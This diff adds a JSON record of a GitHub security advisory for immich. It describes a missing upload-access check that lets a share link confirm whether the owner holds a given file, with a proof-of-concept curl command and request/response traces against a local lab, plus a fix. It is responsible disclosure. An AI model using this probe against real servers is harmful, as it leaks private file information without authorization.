@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-xm8q-2hq2-gpxg",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 3.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "### Summary\r\n\r\nAnyone with a share link URL can ask the server if the owner has a particular file. If the owner\r\nhas it, the server returns that file's asset ID. You need the file itself to ask, so this confirms a\r\nguess rather than finding something new.\r\n\r\nIt works on assets the link does not cover. That includes assets in the Locked Folder and assets in\r\nthe trash. The owner sees nothing.\r\n\r\nThe link does not need upload permission. `allowUpload` is `false` by default when a link is created\r\n(`server/src/schema/tables/shared-link.table.ts:38`), so this is the normal setup. A link password\r\ndoes not stop it.\r\n\r\nThe request is an upload call with no file attached:\r\n\r\n```\r\nPOST /api/assets?key=<link key>\r\nx-immich-checksum: <sha1 of the file>\r\nContent-Length: 0\r\n\r\n200 {\"status\":\"duplicate\",\"id\":\"f0b032ae-6c9f-495b-ba98-33cba14419b5\"}\r\n```\r\n\r\nThe same link sending a real file gets `401`.\r\n\r\n### Details\r\n\r\nFour methods in `server/src/services/asset-media.service.ts` can be reached from `POST /api/assets`.\r\nThree of them call `requireUploadAccess(auth)`:\r\n\r\n```\r\n 46:  async getUploadAssetIdByChecksum(...)    <- no check\r\n 60:    requireUploadAccess(auth);             canUploadFile\r\n 92:    requireUploadAccess(auth);             getUploadFilename\r\n105:    auth = requireUploadAccess(auth);      getUploadFolder\r\n```\r\n\r\nLine 46 is the one without the check. Line 46 is also the one a share link reaches.\r\n\r\nIt gets there through the interceptor. `server/src/controllers/asset-media.controller.ts:51-53`\r\nlists `AssetUploadInterceptor` before `FileUploadInterceptor`, so it runs first:\r\n\r\n```ts\r\n// server/src/middleware/asset-upload.interceptor.ts:18-25\r\nconst checksum = fromMaybeArray(req.headers[ImmichHeader.Checksum]);\r\nconst response = await this.service.getUploadAssetIdByChecksum(req.user, checksum);\r\nif (response) {\r\n  res.status(200);\r\n  return of({ status: AssetMediaStatus.DUPLICATE, id: response.id });\r\n}\r\n\r\nreturn next.handle();\r\n```\r\n\r\nWhen the checksum matches, it answers and never calls `next.handle()`. So `FileUploadInterceptor`\r\nand the controller handler never run. The upload checks are in those.\r\n\r\nThe query behind the lookup (`server/src/repositories/asset.repository.ts:683`) filters on `ownerId`\r\nand `libraryId is null`. Every asset the owner uploaded is in range. External library assets are\r\nnot.\r\n\r\nThis is the check that would stop it:\r\n\r\n```ts\r\n// server/src/utils/access.ts:41-46\r\nexport const requireUploadAccess = (auth: AuthDto | null): AuthDto => {\r\n  if (!auth || (auth.sharedLink && !auth.sharedLink.allowUpload)) {\r\n    throw new UnauthorizedException();\r\n  }\r\n  return auth;\r\n};\r\n```\r\n\r\n### Proof of concept\r\n\r\nimmich v3.3.1 in Docker. One owner with four assets: one in an album, one outside it, one in the\r\nLocked Folder, one in the trash. The album is shared with `allowUpload: false` and\r\n`allowDownload: false`. The link covers that album only.\r\n\r\nThe asset in the album is readable. The one outside it is not:\r\n\r\n```\r\nGET /api/assets/dfb3eb32-1b82-4837-951c-1db8b464150d?key=<key>   200\r\nGET /api/assets/f0b032ae-6c9f-495b-ba98-33cba14419b5?key=<key>   400 {\"message\":\"Not found or no asset.read access\"}\r\n```\r\n\r\nThe same link, asking by checksum:\r\n\r\n```\r\nPOST /api/assets?key=<key>   x-immich-checksum: d5b6ee825e3d29140cad6cd9e181167e6090dc3e\r\n  200 {\"status\":\"duplicate\",\"id\":\"f0b032ae-6c9f-495b-ba98-33cba14419b5\"}    outside the album\r\nPOST /api/assets?key=<key>   x-immich-checksum: 30e0cedb8fc8fe6deb239cf06b5aed8e054acecb\r\n  200 {\"status\":\"duplicate\",\"id\":\"a17be255-b684-45ee-aa39-4bd8822c04f6\"}    Locked Folder\r\nPOST /api/assets?key=<key>   x-immich-checksum: 1820c639b7ca6711a2992dc922adbf383a346dd2\r\n  200 {\"status\":\"duplicate\",\"id\":\"5ec503be-f1ac-4da7-baf3-4ab47b760323\"}    trash\r\n```\r\n\r\nTwo controls on the same link:\r\n\r\n```\r\nPOST /api/assets?key=<key>   multipart/form-data with a real file   401 {\"message\":\"Unauthorized\"}\r\nPOST /api/assets             checksum header, no key                401 {\"message\":\"Authentication required\"}\r\n```\r\n\r\nA real upload is blocked, and the link key is what makes the checksum call work.\r\n\r\nIf the owner does not have the file, the answer is `400` with a validation error about the missing\r\nbody. A miss calls `next.handle()`, so the request falls through to the real upload path and fails\r\nthere.\r\n\r\nA link password does not help. On a password-protected link,\r\n`GET /api/shared-links/me?key=<key>` returns `401 {\"message\":\"Password required\"}`. The same key\r\nwith the checksum header still returns `200` and the ID.\r\n\r\nOne command, against the lab in the attached bundle:\r\n\r\n```bash\r\ncurl -i -X POST 'http://127.0.0.1:8211/api/assets?key=<link key>' \\\r\n  -H 'x-immich-checksum: d5b6ee825e3d29140cad6cd9e181167e6090dc3e' -H 'Content-Length: 0'\r\n```\r\n\r\nThe bundle has `docker-compose.yml`, `poc.sh`, `evidence.sh` and `EVIDENCE.txt` with full headers and\r\nbodies for all eleven exchanges. `poc.sh` creates its own admin and assets, so it runs against an\r\nempty container. It needs bash, curl and python3.\r\n\r\n### Impact\r\n\r\nThe ID does not let the caller read the asset. `GET /assets/<id>?key=` is still `400`. What leaks is\r\nthat the owner has that exact file, and its ID. It covers assets the link was never meant to reach,\r\nand assets the owner hid by locking or trashing them.\r\n\r\n### Fix\r\n\r\nAdd the call the other three methods already make:\r\n\r\n```diff\r\n--- a/server/src/services/asset-media.service.ts\r\n+++ b/server/src/services/asset-media.service.ts\r\n@@\r\n   async getUploadAssetIdByChecksum(auth: AuthDto, checksum?: string) {\r\n     if (!checksum) {\r\n       return;\r\n     }\r\n+    requireUploadAccess(auth);\r\n```\r\n\r\nIt throws the same `401` the real upload path returns today. I would put it here rather than in the\r\ninterceptor. It keeps the check next to the lookup, and it matches the other three methods in the\r\nfile.\r\n\r\nConfirmed on v3.3.1. The interceptor and the method are unchanged in v3.3.3.\r\n\r\n### Disclosure\r\n\r\nPlease request a CVE when you publish this. I am happy to retest a patch.\r\n\r\nAll testing was against a container I ran locally.\r\n\r\nReported by Asif Masood (A51F221B), Application Security Engineer.\r\n",
+    "ghsa_id": "GHSA-xm8q-2hq2-gpxg",
+    "html_url": "https://github.com/immich-app/immich/security/advisories/GHSA-xm8q-2hq2-gpxg",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-xm8q-2hq2-gpxg"
+      }
+    ],
+    "published_at": "2026-11-10T18:45:01Z",
+    "references": [],
+    "severity": "low",
+    "summary": "A share link with uploads disabled can test whether the owner has a given file",
+    "updated_at": "2026-11-10T18:45:01Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "other",
+          "name": "immich-app/immich"
+        },
+        "patched_versions": "v3.4.0",
+        "vulnerable_version_range": "<= v3.3.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "immich-app/immich"
+}
